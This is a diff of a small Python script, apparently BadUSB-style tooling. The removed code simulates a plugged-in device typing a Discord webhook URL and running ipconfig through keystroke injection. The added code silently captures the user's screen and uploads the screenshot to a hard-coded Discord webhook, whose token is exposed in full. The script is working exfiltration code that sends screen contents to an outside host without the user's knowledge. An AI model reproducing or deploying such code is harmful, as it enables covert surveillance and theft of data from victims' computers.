@@ -1,42 +1,28 @@
-import subprocess
-import time
-import sys
-
-# Function to install pyautogui if it's not installed
-def install_pyautogui():
-    try:
-        import pyautogui
-    except ImportError:
-        print("Installing pyautogui...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyautogui"])
-
-# Install pyautogui
-install_pyautogui()
-
-# Now we can import pyautogui and use it
+import requests
 import pyautogui
+import time
 
-# Wait a moment to simulate the delay after the device is plugged in
-time.sleep(2)
+# Your Discord Webhook URL
+WEBHOOK_URL = "https://discord.com/api/webhooks/1329516594887659611/FEgNHjHO6JzJ_AcclPtkHiTKsfZ-gRtz3j0jUlSbv_yAjbUODrj-s-bXCm65tilMBriQ"
 
-# Simulate opening the Run dialog (Win + R)
-pyautogui.hotkey('win', 'r')  # Simulates Win + R
-time.sleep(1)
+# Screenshot filename
+screenshot_filename = "screenshot.png"
 
-# Open a web browser and navigate to a URL (Discord Webhook)
-url = "https://discord.com/api/webhooks/1329516594887659611/FEgNHjHO6JzJ_AcclPtkHiTKsfZ-gRtz3j0jUlSbv_yAjbUODrj-s-bXCm65tilMBriQ"
-pyautogui.write(url)
-pyautogui.press('enter')
+def take_screenshot():
+    # Take a screenshot
+    screenshot = pyautogui.screenshot()
+    screenshot.save(screenshot_filename)
 
-time.sleep(2)
+def send_to_discord():
+    with open(screenshot_filename, "rb") as file:
+        response = requests.post(WEBHOOK_URL, files={"file": file})
+        
+    if response.status_code == 200:
+        print("Screenshot sent successfully!")
+    else:
+        print(f"Failed to send screenshot! Status code: {response.status_code}, Response: {response.text}")
 
-# Open command prompt and execute a command
-pyautogui.hotkey('win', 'r')  # Open Run dialog again
-time.sleep(1)
-pyautogui.write('cmd')
-pyautogui.press('enter')
-time.sleep(1)
-
-# Simulate typing the 'ipconfig' command and pressing enter
-pyautogui.write('ipconfig')
-pyautogui.press('enter')
+if __name__ == "__main__":
+    take_screenshot()
+    time.sleep(1)  # Give it a moment to ensure the file is saved
+    send_to_discord()
